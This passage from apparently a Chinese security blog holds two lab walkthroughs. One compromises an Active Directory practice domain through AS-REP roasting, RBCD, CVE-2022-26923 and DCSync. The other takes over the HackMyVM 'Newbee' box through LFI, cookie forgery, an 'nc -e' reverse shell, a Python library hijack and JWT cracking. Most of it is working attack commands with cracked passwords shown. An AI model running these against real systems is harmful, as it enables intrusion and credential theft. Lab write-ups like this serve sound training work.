proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies/usr/share/doc/python3-impacket/examples/GetNPUsers.py: 165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)$krb5asrep$ 23 $lixiuying@xiaorang.lab@XIAORANG.LAB:28dc48860e014c6d18a29bad65ba6cc8$ b6924f808e7a4d56bd403bc0e5286ad6b1cb1a39ee59331e484a90801fa82bbcb6b685236b61c5976a05330006b74f304fcfb56793de9c78d38caa16075bef947ad898c8b1130dad240a8298a98e86f18af90cebb015502c7758d6a32c366a42395d08877902d303ee0662540653b3c87c14d6d5319b63e5c5eaf6250d7e82d48d57afc56492344b618b054d6a75cf5ee014f00e92311479dba0ccb54c77b072213a42b79862f913a77a6b0fae4f9a67755ca83b583220c30b6f77296098c71bb42a2cbd8197bcd4e30598ecfbf519899b44cc5d723a4a49fc26db1a4b678a1afd4acea4b42b72949e677edd[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)$krb5asrep$ 23 $huachunmei@xiaorang.lab@XIAORANG.LAB:2fad79d14745c573303bd34c39f80e7f$ 0d9522fc4669f0e04b80e36cef3370c1cce5e232e2b131d6d652c7e2dad452a86918cfbd25e78a701896943ba6b50e241f27b8af4b5d79cffef11fd4ee2392325a468f8ff648e70a74e7d9d2ce58990dc91b36a5c84c2ffa7f45e7cdd852dc2a8df1e5e2f9491eb5c5753cdf54cac6cc2eed2a8b9b58c3693b058fcb6a6187ae49c4d80732aa40e0e3296313962128d414b85f75cb87af301ca39664fffc192e1b62755178c4c6b8f13dd70ff912c4f637a970f33bc367e84e4c1dcb31ade4a20b0bdf8bd7c64c19adf091f4850a8ea2c7a7428bbcb17ef7c87e02ae3b5f9637902612ba8fbe65b7599a7d7e[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User lihongxia@xiaorang.lab doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User wangyulan@xiaorang.lab doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User chenjianhua@xiaorang.lab doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) 返回了两个票据, 用 hashcat 爆破 12345┌──(root㉿kali)-[~/Desktop/tmp]└─# hashcat -m 18200 user.txt /usr/share/wordlists/rockyou.txt --show[proxychains] DLL init: proxychains-ng 4.17$krb5asrep$ 23 $lixiuying@xiaorang.lab@XIAORANG.LAB:dbd1dee4c07eea9541a9f1af91b93180$ b4d238908b8d37009f9dfb5402a13f1b60567f4f8185fbbf5c9fbefe14bbe0b1f89980cd604ff68b572afe6af2d1bb4d6720abc8bdc51e47df9da3ebb4801d08f8be90c12343699eff8855dbfc0d63e796ffcec62169fa4e3ee97440ca0eb2eb985e6785f93aa1d34444235b1ce8937acf0121fe05ec2c589ba625fab1c90bd168637124f99378007fa9c459b07f946a65d3c7131cdad16af4b591becc04526125e2c255072df4a32214d393aab5f27cff28b66859c1b9bb06600d4c7a51cd7ae583d4602fd1ebd6ffc269ee60ed861abb28bb547de5e848955d5279d9e08523edb67fbd171d1af1730f2fba: winniethepooh$krb5asrep$ 23 $huachunmei@xiaorang.lab@XIAORANG.LAB:c640ad4dd669f00b128bad8d1ef8df86$ 0b8e74c7b36ec7daceb707ce176d18a8d15f8cd3ba3154f8ae4f29e9e54f538ab19bc766ea554698677d7f1e6f9418fd7419d82a1ca79582ed70f3de5b5c771a6e7df373fc84a9921b697e7c7d42c17e85f1b2ae73b1ec15bf1bbc59e20bfb2d4e5e52c53c1e88da9c0815434acd8298948f7becb0f15bfdcce4153d025570249523f7507c20f694f5e0ec23c8e7ef5d446aa5fec15315ab314658fc36befc39d7cdf037fa1f165a83ab257fa34a17c4b512ccca27284b97d8f7bdf51cdb0a069e2df4f952c3c52fa47fb58a0fe4e80d0907062fad92edf4d799306ddb103468accf1c2a6b172f2bd7d7c61d: 1qaz2wsx 用 bloodhound 进行域内信息搜集 1234567891011121314151617181920┌──(root㉿kali)-[~/Desktop/tmp]└─# bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -dc XR-DC01.xiaorang.lab -c all --dns-tcp -ns 172.22.15.13 --auth-method ntlm --zipINFO: Found AD domain: xiaorang.labINFO: Connecting to LDAP server: XR-DC01.xiaorang.labINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 3 computersINFO: Connecting to LDAP server: XR-DC01.xiaorang.labINFO: Found 37 usersINFO: Found 53 groupsINFO: Found 2 gposINFO: Found 1 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: XR-CA.xiaorang.labINFO: Querying computer: XR-0687.xiaorang.labINFO: Querying computer: XR-DC01.xiaorang.labINFO: Done in 00M 05SINFO: Compressing output into 20250402040344_bloodhound.zip 域用户 LIXIUYING 对计算机 XR-0687$ 具有 Generic Write 权限 可以通过修改目标的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性（配置 RBCD）获取目标 SYSTEM 权限。 添加一个机器用户 12345┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-addcomputer -computer-name &#x27;EVILCOMPUTER$&#x27; -computer-pass &#x27;123@#ABC&#x27; -dc-host XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 &quot; xiaorang.lab/lixiuying: winniethepooh &quot;Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Successfully added machine account EVILCOMPUTER$ with password 123@#ABC. 然后配置 RBCD： 123456789┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-rbcd xiaorang.lab/lixiuying: winniethepooh -action write -delegate-from &quot;EVILCOMPUTER $&quot; -delegate-to &quot;XR-0687$&quot; -dc-ip 172.22.15.13Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty[*] Delegation rights modified successfully![*] EVILCOMPUTER $ can now impersonate users on XR-0687$ via S4U2Proxy[*] Accounts allowed to act on behalf of other identity:[*] EVILCOMPUTER$ (S-1-5-21-3745972894-1678056601-2622918667-1147) 请求并冒充域管权限的服务票据： 123456789101112131415161718┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-getST xiaorang.lab/EVILCOMPUTER$:&#x27;123@#ABC&#x27; -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[-] CCache file is not found. Skipping...[*] Getting TGT for user[*] Impersonating Administrator/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow()/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1)[*] Requesting S4U2self/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow()/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1)[*] Requesting S4U2Proxy[*] Saving ticket in Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache 123456789101112131415161718──(root㉿kali)-[~/Desktop/tmp]└─# export KRB5CCNAME = Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-psexec &#x27;xiaorang.lab/administrator@XR-0687.xiaorang.lab&#x27; -target-ip 172.22.15.35 -codec gbk -no-pass -kImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on 172.22.15.35.....[*] Found writable share ADMIN$[*] Uploading file RHzxEZPZ.exe[*] Opening SVCManager on 172.22.15.35.....[*] Creating service etRo on 172.22.15.35.....[*] Starting service etRo.....[!] Press help for extra shell commandsMicrosoft Windows [版本 10.0.20348.1668](c) Microsoft Corporation。保留所有权利。C:\\Windows\\system32 &gt; flag03 在 C:\\users\\Administrator\\flag\\ 主机 172.22.15.18 (XR-CA) 存在 CVE-2022-26923 漏洞 打 CVE-2022–26923 查找证书服务器，并尝试查找可以利用的证书模板： 1234567891011121314151617181920212223242526272829┌──(root㉿kali)-[~/Desktop/tmp]└─# certipy-ad find -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -vulnerable -stdoutCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Finding certificate templates[*] Found 34 certificate templates[*] Finding certificate authorities[*] Found 1 certificate authority[*] Found 12 enabled certificate templates[*] Trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via CSRA[!] Got error while trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via CSRA: Could not connect: [Errno 111] Connection refused[*] Trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via RRP[!] Got error while trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via RRP: [Errno Connection error (224.0.0.1:445)] [Errno 111] Connection refused[!] Failed to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27;[*] Enumeration output:Certificate Authorities 0 CA Name : xiaorang-XR-CA-CA DNS Name : XR-CA.xiaorang.lab Certificate Subject : CN = xiaorang-XR-CA-CA, DC = xiaorang, DC = lab Certificate Serial Number : 3ECFB0112E93BE9041059FA6DBB3C35A Certificate Validity Start : 2023-06-03 07:19:59+00:00 Certificate Validity End : 2028-06-03 07:29:58+00:00 Web Enrollment : Disabled User Specified SAN : Unknown Request Disposition : Unknown Enforce Encryption for Requests : UnknownCertificate Templates : [!] Could not find any certificate templates 使用 certipy 创建一个机器账户，并将该机器账户 dNSHostName 属性指向域控： 12345678910111213┌──(root㉿kali)-[~/Desktop/tmp]└─# certipy-ad account create -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -user &#x27;EVILCOMPUTER2$&#x27; -pass &#x27;123@#ABC&#x27; -dns &#x27;XR-DC01.xiaorang.lab&#x27;Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Creating new account: sAMAccountName : EVILCOMPUTER2$ unicodePwd : 123@#ABC userAccountControl : 4096 servicePrincipalName : HOST/EVILCOMPUTER2 RestrictedKrbHost/EVILCOMPUTER2 dnsHostName : XR-DC01.xiaorang.lab[*] Successfully created account &#x27;EVILCOMPUTER2$&#x27; with password &#x27;123@#ABC&#x27; 使用该机器账户向 AD CS 服务器请求域控机器的证书模板： 12345678910┌──(root㉿kali)-[~/Desktop/tmp]└─# certipy-ad req -u EVILCOMPUTER2\\$@xiaorang.lab -p &#x27;123@#ABC&#x27; -target 172.22.15.18 -ca &quot;xiaorang-XR-CA-CA&quot; -template MachineCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[*] Successfully requested certificate[*] Request ID is 7[*] Got certificate with DNS Host Name &#x27;XR-DC01.xiaorang.lab&#x27;[*] Certificate has no object SID[*] Saved certificate and private key to &#x27;xr-dc01.pfx&#x27; 用申请到的证书，申请域控的 TGT： 1234567┌──(root㉿kali)-[~/Desktop/tmp]└─# certipy-ad auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13 -debugCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: xr-dc01$@xiaorang.lab[*] Trying to get TGT...[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type) 使用 certipy 请求 TGT 失败，出现 KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type) 错误。 bloodyAD 使用证书进行认证，配置 RBCD 进行攻击： 1234567┌──(root㉿kali)-[~/Desktop/tmp]└─# certipy-ad cert -pfx xr-dc01.pfx &gt; xr-dc01.pemCertipy v4.8.2 - by Oliver Lyak (ly4k)┌──(root㉿kali)-[~/Desktop/tmp]└─# bloodyAD -d xiaorang.lab -u &#x27;EVILCOMPUTER2 $&#x27; -c &#x27;:xr-dc01.pem&#x27; --host 172.22.15.13 --secure add rbcd &#x27;xr-dc01$&#x27; &#x27;EVILCOMPUTER2$&#x27;[!] No security descriptor has been returned, a new one will be created[+] EVILCOMPUTER2 $ can now impersonate users on xr-dc01$ via S4U2Proxy 请求并冒充域管权限的服务票据： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-getST &#x27;xiaorang.lab/EVILCOMPUTER2$: 123@#ABC&#x27; -spn LDAP/xr-dc01.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Getting TGT for user[*] Impersonating Administrator/usr/share/doc/python3-impacket/examples/getST.py: 380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow()/usr/share/doc/python3-impacket/examples/getST.py: 477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)[*] Requesting S4U2self/usr/share/doc/python3-impacket/examples/getST.py: 607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow()/usr/share/doc/python3-impacket/examples/getST.py: 659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)[*] Requesting S4U2Proxy[*] Saving ticket in Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccache┌──(root㉿kali)-[~/Desktop/tmp]└─# export KRB5CCNAME = Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccacheDCSync 从域控导出凭据：┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-secretsdump &#x27;xiaorang.lab/administrator@XR-DC01.xiaorang.lab&#x27; -target-ip 172.22.15.13 -no-pass -k -just-dc-user AdministratorImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Dumping Domain Credentials (domain\\uid: rid: lmhash: nthash)[*] Using the DRSUAPI method to get NTDS.DIT secrets[-] &#x27;NoneType&#x27; object has no attribute &#x27;getRemoteHost&#x27;[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter[*] Cleaning up...PTH 登录域控：┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-psexec &#x27;xiaorang.lab/administrator@XR-DC01.xiaorang.lab&#x27; -target-ip 172.22.15.13 -codec gbk -no-pass -kImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on 172.22.15.13.....[*] Found writable share ADMIN$[*] Uploading file FavsxEaA.exe[*] Opening SVCManager on 172.22.15.13.....[*] Creating service fjnA on 172.22.15.13.....[*] Starting service fjnA.....[!] Press help for extra shell commandsMicrosoft Windows [版本 10.0.14393](c) 2016 Microsoft Corporation。保留所有权利。C:\\windows\\system32 &gt; flag 在 C:\\Users\\Administrator\\flag 下 参考https://h0ny.github.io/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#as-rep-roasting https://x1nri.github.io/2025/01/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3/","categories":[{"name":"春秋云镜","slug":"春秋云镜","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"Hackmyvm-Newbee","slug":"Hackmyvm-Newbee","date":"2025-03-26T12:10:10.000Z","updated":"2025-04-19T13:25:36.809Z","comments":true,"path":"2025/03/26/Hackmyvm-Newbee/","permalink":"https://lvzhouhang.xyz/2025/03/26/Hackmyvm-Newbee/","excerpt":"","text":"信息搜集arp-scan -l 1234567891011┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:f5:b9:af PCS Systemtechnik GmbH192.168.31.122 00:0c:29:71:20:21 VMware, Inc.3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 2.384 seconds (107.38 hosts/sec). 3 responded 192.168.31.122就是ip地址 nmap 192.168.31.122 -p-扫描端口 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.122 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 08:21 EDTNmap scan report for 192.168.31.122Host is up (0.00090s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 00:0C:29:71:20:21 (VMware)Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds 80端口查看页面源码，在最下面可以发现有一个 1&lt;!--Wrong paramter to GET--&gt; 对get参数进行fuzz 12345678910111213141516┌──(root㉿kali)-[~/Desktop/tmp]└─# wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &quot;http://192.168.31.122?FUZZ=/etc/passwd&quot; --hh 18851 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://192.168.31.122?FUZZ=/etc/passwd/Total requests: 220559=====================================================================ID Response Lines Word Chars Payload=====================================================================000001799: 200 376 L 1270 W 18863 Ch &quot;hack&quot; 能fuzz出来参数名为hack，但是页面最下方还是会报错 1&lt;!-- include failed try another file --&gt; 尝试包含其他文件 扫描目录可以扫描到一个secret.php 1234567891011121314151617181920212223242526272829303132┌──(root㉿kali)-[~/Desktop/tmp]└─# gobuster dir -u &quot;http://192.168.31.122/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.122/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: php,txt[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.php (Status: 403) [Size: 279]/index.php (Status: 200) [Size: 18852]/contact.php (Status: 200) [Size: 8853]/about.php (Status: 200) [Size: 10036]/blog.php (Status: 200) [Size: 9782]/products.php (Status: 200) [Size: 12163]/terms.php (Status: 200) [Size: 6670]/assets (Status: 301) [Size: 317] [--&gt; http://192.168.31.122/assets/]/testimonials.php (Status: 200) [Size: 7907]/javascript (Status: 301) [Size: 321] [--&gt; http://192.168.31.122/javascript/]/checkout.php (Status: 200) [Size: 13307]/secret.php (Status: 200) [Size: 2187]/.php (Status: 403) [Size: 279]/server-status (Status: 403) [Size: 279] secret.php可以执行命令，但是必须要先进行身份验证，用lfi包含secret.php试试 1http://192.168.31.122/?hack=php://filter/convert.base64-encode/resource=secret.php 可以包含出来 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#secret.php&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;命令行控制台&lt;/title&gt; &lt;style&gt; body &#123; background-color: #1e1e1e; font-family: Consolas, monospace; color: #fff; margin: 0; padding: 0; &#125; .console &#123; width: 80%; margin: 50px auto; padding: 20px; background-color: #000; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5); height: 400px; overflow-y: auto; font-size: 16px; &#125; .output &#123; white-space: pre-wrap; margin-bottom: 10px; &#125; .input-container &#123; display: flex; align-items: center; &#125; .input-container .prompt &#123; color: #00ff00; margin-right: 5px; &#125; .input-container input &#123; background: transparent; border: none; color: #fff; width: 100%; padding: 5px; font-size: 16px; outline: none; &#125; .input-container input:focus &#123; border: 1px solid #00ff00; &#125; .input-container input::placeholder &#123; color: #888; &#125; .console-footer &#123; padding-top: 10px; color: #888; font-size: 12px; text-align: center; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;console&quot;&gt; &lt;div class=&quot;output&quot; id=&quot;output&quot;&gt; &lt;?php if (isset($_COOKIE[&#x27;AreYouAdmin&#x27;]) &amp;&amp; $_COOKIE[&#x27;AreYouAdmin&#x27;] === &#x27;Yes&#x27;) &#123; if (isset($_GET[&#x27;command&#x27;])) &#123; $command = $_GET[&#x27;command&#x27;]; $output = shell_exec($command); echo &#x27;&lt;div&gt;\\&gt; &#x27; . htmlspecialchars($command) . &#x27;&lt;/div&gt;&#x27;; echo &#x27;&lt;div&gt;&#x27; . nl2br(htmlspecialchars($output)) . &#x27;&lt;/div&gt;&#x27;; &#125; &#125; else &#123; echo &#x27;&lt;div&gt;No permission to execute commands, lacking admin permission.&lt;/div&gt;&#x27;; &#125; ?&gt; &lt;/div&gt; &lt;div class=&quot;input-container&quot;&gt; &lt;span class=&quot;prompt&quot;&gt;\\&gt;&lt;/span&gt; &lt;form method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;command&quot; id=&quot;input&quot; placeholder=&quot;command...&quot; autocomplete=&quot;off&quot;&gt; &lt;/form&gt; &lt;/div&gt;&lt;/div&gt;&lt;script&gt; const inputField = document.getElementById(&quot;input&quot;); inputField.focus();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 伪造cookie 1Cookie: AreYouAdmin=yes 然后反弹shell 12nc -e /bin/bash 192.168.31.129 4444script -qc /bin/bash /dev/null #获得交互式shell 提权123456789www-data@Newbee:/var/www/html/shop$ sudo -lsudo: unable to resolve host Newbee: Temporary failure in name resolutionMatching Defaults entries for www-data on Newbee: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, targetpw, use_ptyUser www-data may run the following commands on Newbee: (debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py 1234567891011121314151617181920212223242526272829303132333435363738#vuln.pyimport randomimport timeimport mathimport stringimport datetimedef generate_random_string(length=10): return &#x27;&#x27;.join(random.choices(string.ascii_letters + string.digits, k=length))def pointless_computation(): number = random.randint(1, 1000) result = math.sqrt(number) * math.log(number) print(f&quot;Calculated math nonsense: sqrt(&#123;number&#125;) * log(&#123;number&#125;) = &#123;result&#125;&quot;)def simulate_time_wasting(): now = datetime.datetime.now() print(f&quot;Started wasting time at &#123;now&#125;&quot;) time.sleep(2) # 故意睡眠 2 秒 later = datetime.datetime.now() print(f&quot;Finished wasting time at &#123;later&#125;. Time wasted: &#123;later - now&#125;&quot;)def pointless_string_operations(): rand_str = generate_random_string() print(f&quot;Generated random string: &#123;rand_str&#125;&quot;) reversed_str = rand_str[::-1] print(f&quot;Reversed string: &#123;reversed_str&#125;&quot;) print(f&quot;String length: &#123;len(rand_str)&#125;&quot;)if __name__ == &quot;__main__&quot;: pointless_computation() simulate_time_wasting() pointless_string_operations() print(&quot;All done. The script accomplished nothing useful.&quot;) 可以在/var/www/html目录下创建一个random.py文件进行劫持，python文件会优先加载当前目录下的库 123#random.pyimport osos.system(&quot;bash -p&quot;) 12www-data@Newbee:/var/www/html$ sudo -u debian /usr/bin/python3 /var/www/html/vuln.pydebian@Newbee:/var/www/html$ 提到debian用户了，home目录下有一个note.txt和一个config.php 12debian@Newbee:~$ cat note.txtDamn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me 1234567891011debian@Newbee:~$ cat config.php&lt;?php$servername = &quot;localhost&quot;;$username = &quot;root&quot;;$password = &quot;$conn = new mysqli($servername, $username, $password);........................ 要拿到数据库的密码 查看端口 12345678debian@Newbee:~$ ss -lntupNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Processudp UNCONN 0 0 0.0.0.0:68 0.0.0.0:*tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:*tcp LISTEN 0 128 127.0.0.1:5000 0.0.0.0:*tcp LISTEN 0 128 [::]:22 [::]:*tcp LISTEN 0 511 *:80 *:* 可以发现本地有5000端口，用socat将5000端口转发出去 1debian@Newbee:~$ socat TCP-LISTEN:5001,fork TCP4:127.0.0.1:5000 是一个留言板，登录处除了admin，其他的都可以随意登录，cookie里有一个jwt，可以猜测是jwt伪造 可以用hashcat爆破 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354┌──(root㉿kali)-[~/Desktop/tmp]└─# hashcat -a 0 -m 16500 ./1 /usr/share/wordlists/rockyou.txthashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]============================================================================================================================================* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 MB (1024 MB allocatable), 8MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Not-Iterated* Single-Hash* Single-SaltWatchdog: Temperature abort trigger set to 90cHost memory required for this attack: 2 MBDictionary cache hit:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344385* Bytes.....: 139921507* Keyspace..: 14344385eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMzEyMyIsImV4cCI6MTc0MzAyNTM4OH0.qTMF9XS0BYo7nKIDg9rFr1qmUfR4btXsLS7GZv2QVW4:noobSession..........: hashcatStatus...........: CrackedHash.Mode........: 16500 (JWT (JSON Web Token))Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZS...v2QVW4Time.Started.....: Wed Mar 26 08:44:45 2025 (3 secs)Time.Estimated...: Wed Mar 26 08:44:48 2025 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 2052.7 kH/s (0.87ms) @ Accel:512 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)Progress.........: 5025792/14344385 (35.04%)Rejected.........: 0/5025792 (0.00%)Restore.Point....: 5021696/14344385 (35.01%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: noobface888 -&gt; nona1807Hardware.Mon.#1..: Util: 44%Started: Wed Mar 26 08:44:44 2025Stopped: Wed Mar 26 08:44:49 2025 noob就是密钥，用户名伪造成admin，可以看到留言板的内容 1234567891011121314debian@Newbee:~$ mysql -uroot -pTheStrongestPasswordHYHcreatedWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 